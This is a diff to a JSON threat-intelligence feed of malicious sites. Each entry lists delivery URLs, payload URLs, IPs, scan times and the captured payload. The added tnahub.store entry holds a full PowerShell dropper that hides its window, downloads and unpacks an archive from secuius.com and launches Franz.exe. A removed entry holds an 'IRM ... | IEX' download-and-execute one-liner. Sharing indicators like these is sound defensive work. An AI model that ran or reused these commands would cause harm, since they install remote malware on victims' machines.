@@ -1,5 +1,53 @@
 [
   {
+    "UrlDomain": "tnahub.store",
+    "DeliveryUrl": [
+      "secuius.com"
+    ],
+    "PayloadUrl": [
+      "https://secuius.com/yiy"
+    ],
+    "IP": [
+      "91.108.98.63"
+    ],
+    "Related": [
+      {
+        "Value": "https://secuius.com/zvmf",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://secuius.com/ry",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://secuius.com/tk.js?ver=1.0.1",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://solar-kindle-rook-feoara.pro/t.js?site=9ccdccf86455f7c6777775d18c52beeb",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://secuius.com/6o",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://secuius.com/qmbp",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://secuius.com/6o#0",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "$url = \"https://secuius[.]com/yIY\";\n$filename = \"Franz.exe\";\n$path = \"$env:TEMP\";\n$archive = Join-Path $path \"d19JSWg2.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://secuius.com/yIY"
+    ],
+    "ReportId": "cmwyj42lt0i3c0omlqfkyvjoj",
+    "ScannedAt": "2026-11-27T05:16:37.378000+00:00"
+  },
+  {
     "UrlDomain": "luxware.dk",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -4170,25 +4218,5 @@
     ],
     "ReportId": "cmwrfvujw2j350omlr7lq12wu",
     "ScannedAt": "2026-11-22T06:11:51.571000+00:00"
-  },
-  {
-    "UrlDomain": "folmars.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "107.180.113.70"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/joon1286/1fdbd074-392d-4285-b67e-ff498ddcb29e/-/raw/main/b04f13f7-5981-4267-afc4-1e6152d7b677 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/joon1286/1fdbd074-392d-4285-b67e-ff498ddcb29e/-/raw/main/b04f13f7-5981-4267-afc4-1e6152d7b677"
-    ],
-    "ReportId": "cmwrdyff62irs0omlxjwupgay",
-    "ScannedAt": "2026-11-22T05:17:52.705000+00:00"
   }
 ]
